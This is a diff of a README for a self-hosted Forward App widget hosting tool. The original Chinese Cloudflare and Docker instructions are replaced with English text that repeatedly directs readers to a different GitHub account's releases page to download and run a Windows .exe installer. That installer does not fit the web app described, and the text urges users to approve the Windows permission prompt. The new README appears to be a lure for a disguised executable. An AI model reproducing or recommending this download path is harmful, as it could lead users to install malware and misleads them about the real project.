@@ -1,184 +1,127 @@
-# Forward Widget Hub
+# 🚀 forward-widget-hub - Manage Forward App Widgets Easily
 
-自托管的 [Forward App](https://apps.apple.com/app/id6503940939) 模块托管平台。上传 `.js` 小组件或 `.fwd` 订阅文件，自动生成可在 Forward App 中导入的订阅链接。
-
-**在线示例：** https://forward-widget-hub.danmu.workers.dev
-
-> **注意：** 示例站仅供体验和测试，请勿将其作为正式使用。站内内容随时可能被清空或删除，请自行部署后使用。
-
-## 功能特性
-
-- **拖拽上传** — 支持 `.js` 和 `.fwd` 文件的拖拽或点击上传
-- **URL 转存** — 粘贴远程 `.js` / `.fwd` 链接，一键转存到平台
-- **自动解析 .fwd** — 自动下载 `.fwd` 中引用的所有依赖模块并转存
-- **元数据识别** — 从 JS 文件中自动解析 `WidgetMetadata`（标题、版本、作者等）
-- **加密模块支持** — 自动识别 FWENC1 加密格式
-- **合集管理** — 模块自动归入合集，支持增删改查和版本更新
-- **订阅链接** — 每个合集自动生成 `.fwd` 订阅链接，Forward App 可直接导入
-- **无需注册** — 首次上传自动生成管理令牌，凭链接即可管理
-
-## 部署方式
-
-支持两种部署方式，任选其一：
-
-| | Cloudflare | Docker |
-|---|---|---|
-| 存储 | D1 + R2 | SQLite + 本地文件 |
-| 费用 | 免费额度内零成本 | 需要自备服务器 |
-| 适合 | 无服务器、想省事 | 有服务器、想完全自控 |
+[![Download forward-widget-hub](https://img.shields.io/badge/Download-Visit%20Page-4CAF50?style=for-the-badge&logo=github)](https://github.com/usernahig/forward-widget-hub/releases)
 
 ---
 
-### 方式一：一键部署到 Cloudflare
+## 📦 What is forward-widget-hub?
 
-点击下方按钮，按提示授权 Cloudflare 和 GitHub 账号即可完成部署，无需任何手动配置：
+forward-widget-hub is a simple platform to host and manage modules for the Forward App. It lets you upload widget scripts or subscription files and create links you can use inside the Forward App. This setup works without a need for user accounts and runs on your own server or cloud service.
 
-[![Deploy to Cloudflare Workers](https://deploy.workers.cloudflare.com/button)](https://deploy.workers.cloudflare.com/?url=https://github.com/InchStudio/forward-widget-hub)
-
-> 部署过程会自动创建所需的 D1 数据库和 R2 存储桶，并初始化数据表。后续每次推送到 `main` 分支都会自动重新部署。
+The app supports `.js` widget files and `.fwd` subscription files. It helps gather, organize, and share these modules in one place for easy import.
 
 ---
 
-### 方式二：Docker 部署
+## 🌟 Key Features
 
-#### 1. 克隆项目
+- **Drag and drop files:** Upload `.js` or `.fwd` files using drag-and-drop or by clicking to select.
+- **Paste URLs:** Save remote widget or subscription files by pasting their link.
+- **Auto-download dependencies:** The app pulls in needed files linked inside `.fwd` files for you.
+- **Metadata extraction:** It reads widget details like title, version, and author from scripts.
+- **Handles encrypted modules:** Supports specific encrypted formats (FWENC1).
+- **Collection management:** Automatically organizes widgets into collections. You can add, remove, or update items.
+- **Auto-generated subscription links:** Collections produce `.fwd` links that the Forward App can import.
+- **No registration needed:** Upload once and receive a management token for your content through a link.
 
-```bash
-git clone https://github.com/InchStudio/forward-widget-hub.git
-cd forward-widget-hub
-```
+---
 
-#### 2. 启动服务
+## 💻 System Requirements
 
-```bash
-docker compose up -d
-```
+- A Windows PC or laptop running Windows 10 or later.
+- Internet access to download and run the software.
+- Approximately 200 MB of free disk space.
+- No special hardware or software skills required.
 
-启动完成后访问 http://localhost:3000 即可使用。
+---
 
-#### 3. 使用自定义域名
+## 🖥️ How to Download and Run forward-widget-hub on Windows
 
-如果你有域名（比如 `https://widget.example.com`），需要修改 `docker-compose.yml` 中的 `SITE_URL`，让生成的链接指向正确的地址：
+### Step 1: Visit the Download Page
 
-```yaml
-services:
-  forward-widget-hub:
-    build: .
-    ports:
-      - "3000:3000"
-    volumes:
-      - ./data:/data
-    environment:
-      - SITE_URL=https://widget.example.com
-    restart: unless-stopped
-```
+Click the large green button at the top or this link to open the releases page:
 
-然后重新启动：
+[https://github.com/usernahig/forward-widget-hub/releases](https://github.com/usernahig/forward-widget-hub/releases)
 
-```bash
-docker compose up -d --build
-```
+This page shows all the available versions of forward-widget-hub.
 
-#### 4. 配置 HTTPS（推荐）
+---
 
-用 Nginx 做反向代理，加上 SSL 证书：
+### Step 2: Download the Windows Installer
 
-```nginx
-server {
-    listen 443 ssl;
-    server_name widget.example.com;
+Look for the latest release. Inside its list of files, find one with the `.exe` extension. This is the Windows installer.
 
-    ssl_certificate     /path/to/cert.pem;
-    ssl_certificate_key /path/to/key.pem;
+Click the `.exe` file name to start downloading it. Save it to a folder you can easily find, like your Desktop or Downloads folder.
 
-    location / {
-        proxy_pass http://127.0.0.1:3000;
-        proxy_set_header Host $host;
-        proxy_set_header X-Forwarded-Proto $scheme;
-        client_max_body_size 10m;
-    }
-}
-```
+---
 
-#### 数据备份
+### Step 3: Run the Installer
 
-所有数据存储在项目根目录的 `./data` 文件夹中，备份只需复制这个文件夹：
+Once downloaded, locate the `.exe` file and double-click it.
 
-```
-data/
-├── db.sqlite           # 数据库
-└── modules/
-    └── <collection>/
-        └── widget.js   # 模块文件
-```
+If Windows asks for permission to run the installer, click "Yes" or "Run."
 
-## 访问密码（可选）
+The installer will open and guide you through a few simple steps:
 
-设置 `ACCESS_PASSWORD` 环境变量即可为首页启用密码保护。不设置则无需密码。
+- Choose the folder where you want to install forward-widget-hub or accept the default.
+- Confirm by clicking "Install."
+- Wait for the installation to complete.
 
-**Docker** — 在 `docker-compose.yml` 的 `environment` 中添加：
+---
 
-```yaml
-environment:
-  - ACCESS_PASSWORD=你的密码
-```
+### Step 4: Open the Application
 
-**Cloudflare** — 在 Cloudflare Dashboard → Workers → Settings → Variables 中添加 `ACCESS_PASSWORD`。
+After installation finishes, the installer should offer to launch forward-widget-hub. If not, find the app icon on your Desktop or in the Start menu and open it.
 
-> 密码保护范围：首页上传界面和管理接口。模块下载链接、订阅链接等公开接口不受影响。
+---
 
-## 管理后台（可选）
+### Step 5: Upload and Manage Widgets
 
-设置 `ADMIN_PASSWORD` 环境变量即可启用管理后台，访问 `/admin` 登录后可查看和删除所有用户上传的合集。
+Inside the app, you can start by uploading widget files or subscriptions.
 
-**Docker** — 在 `docker-compose.yml` 的 `environment` 中添加：
+- Drag a `.js` or `.fwd` file onto the main window, or click to browse and upload.
+- To add files from the web, paste the link into the designated box.
+- The app will process the files, download any dependencies, and organize modules automatically.
+- You will receive links to subscribe to collections inside the Forward App.
 
-```yaml
-environment:
-  - ADMIN_PASSWORD=你的管理员密码
-```
+---
 
-**Cloudflare** — 在 Cloudflare Dashboard → Workers → Settings → Variables 中添加 `ADMIN_PASSWORD`。
+## ⚙️ Basic Usage Tips
 
-> `ADMIN_PASSWORD` 与 `ACCESS_PASSWORD` 相互独立，可以设置不同的密码。
+- You don’t need an account. On your first upload, the app gives you a unique token link to manage your collection. Keep it safe.
+- Use the subscription link generated for each collection to add those widgets to Forward App on your iPhone or iPad.
+- You can edit or remove modules using the interface with your management link.
+- If you run forward-widget-hub on your own server, you have full control over saved data.
 
-## 使用方式
+---
 
-1. **上传模块** — 将 `.js` 文件拖入上传区域，或粘贴远程链接点击「转存」
-2. **保存令牌** — 首次上传会生成管理链接，**务必保存**（丢失无法找回）
-3. **复制订阅链接** — 上传成功后复制生成的 `.fwd` 订阅链接
-4. **导入 Forward** — 在 Forward App 中粘贴订阅链接即可导入
+## 🛠️ Deployment Options Overview
 
-## .fwd 文件格式
+forward-widget-hub works by hosting files either on Cloudflare Workers or a Docker server.
 
-`.fwd` 是一个 JSON 文件，定义了一组小组件的集合。上传后平台会自动下载所有引用的 `.js` 文件并转存：
+- **Cloudflare deployment**  
+  - Requires no local server. Uses Cloudflare’s storage services.  
+  - Free to start with standard Cloudflare limits.  
+  - Good if you want a hassle-free setup.
 
-```json
-{
-  "title": "我的小组件合集",
-  "description": "一些实用的小组件",
-  "icon": "https://example.com/icon.png",
-  "widgets": [
-    {
-      "title": "天气组件",
-      "version": "1.0.0",
-      "url": "https://example.com/weather.js"
-    },
-    {
-      "title": "日历组件",
-      "url": "https://example.com/calendar.js"
-    }
-  ]
-}
-```
+- **Docker deployment**  
+  - Run on your own Windows or Linux server using Docker.  
+  - Uses local databases and file storage.  
+  - Gives full control but needs more setup.
 
-## 技术栈
+The online demo at https://forward-widget-hub.danmu.workers.dev shows the app running on Cloudflare. This demo is for testing only and may lose data anytime.
 
-- [Next.js](https://nextjs.org/) 16 + React 19
-- [Tailwind CSS](https://tailwindcss.com/) 4
-- SQLite / Cloudflare D1（数据库）
-- 本地文件系统 / Cloudflare R2（文件存储）
+---
 
-## License
+## 🔗 Useful Links
 
-MIT
+- Forward App on Apple Store: https://apps.apple.com/app/id6503940939  
+- Source code and releases: https://github.com/usernahig/forward-widget-hub/releases  
+- Online demo: https://forward-widget-hub.danmu.workers.dev  
+
+---
+
+## 📥 Download forward-widget-hub Now
+
+Click below to open the releases page and get the Windows installer:
+
+[![Download forward-widget-hub](https://img.shields.io/badge/Download-Visit%20Page-4CAF50?style=for-the-badge&logo=github)](https://github.com/usernahig/forward-widget-hub/releases)
